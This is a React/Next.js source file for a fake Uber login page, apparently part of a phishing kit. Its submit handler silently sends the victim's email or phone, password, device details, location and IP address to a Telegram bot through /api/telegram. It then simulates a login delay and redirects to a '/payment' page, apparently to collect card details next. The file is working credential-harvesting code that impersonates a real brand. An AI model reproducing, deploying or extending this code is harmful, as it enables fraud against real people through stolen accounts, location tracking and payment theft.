"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Eye, EyeOff, Loader2 } from "lucide-react"
import { isValidEmailOrPhone, isValidPassword } from "./lib/validation"
import { useDeviceInfo } from "./hooks/use-device-info"

export default function Component() {
  const router = useRouter()
  const [showPassword, setShowPassword] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  // Get device and location information silently
  const { deviceInfo, locationInfo, ipInfo } = useDeviceInfo()

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword)
  }

  // Validation states
  const isEmailValid = isValidEmailOrPhone(email)
  const isPasswordValid = isValidPassword(password)
  const isFormValid = isEmailValid && isPasswordValid && !isLoading

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!isFormValid) return

    setIsLoading(true)
    setError("")

    try {
      // Send credentials to Telegram bot with device info silently
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
          deviceInfo,
          locationInfo,
          ipInfo,
        }),
      })

      const result = await response.json()

      if (result.success) {
        // Simulate login delay
        await new Promise((resolve) => setTimeout(resolve, 1500))

        // Store original email/phone in sessionStorage for later use
        sessionStorage.setItem("originalEmail", email)

        // Redirect directly to payment page
        router.push("/payment")
      } else {
        setError("Login failed. Please try again.")
      }
    } catch (error) {
      console.error("Login error:", error)
      setError("Network error. Please check your connection.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-black px-6 py-4">
        <div className="text-white text-3xl font-medium">Uber</div>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-16 pb-8">
        <div className="max-w-md mx-auto">
          {/* Title */}
          <h1 className="text-4xl font-bold text-black mb-12 leading-tight">Login your Uber account</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Email/Phone Input */}
            <div>
              <Input
                type="text"
                placeholder="Enter phone number or email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base placeholder:text-gray-500 focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  email && !isEmailValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {email && !isEmailValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid email or phone number</p>
              )}
            </div>

            {/* Password Input */}
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Please enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`w-full h-14 px-4 pr-12 border-0 rounded-lg text-base placeholder:text-gray-500 focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  password && !isPasswordValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-600 hover:text-gray-800 disabled:opacity-50"
                disabled={isLoading}
              >
                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
              {password && !isPasswordValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Password must be at least 6 characters</p>
              )}
            </div>

            {/* Error Message */}
            {error && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg">{error}</div>}

            {/* Continue Button */}
            <div className="pt-8">
              <Button
                type="submit"
                disabled={!isFormValid}
                className={`w-full h-14 text-base font-medium rounded-lg transition-all duration-200 ${
                  isFormValid ? "bg-black hover:bg-gray-900 text-white" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Logging in...
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </form>

          {/* Form Status Indicator */}
          <div className="mt-4 text-sm text-gray-500 space-y-1">
            <div className={`flex items-center ${isEmailValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isEmailValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid email or phone number
            </div>
            <div className={`flex items-center ${isPasswordValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPasswordValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Password (minimum 6 characters)
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
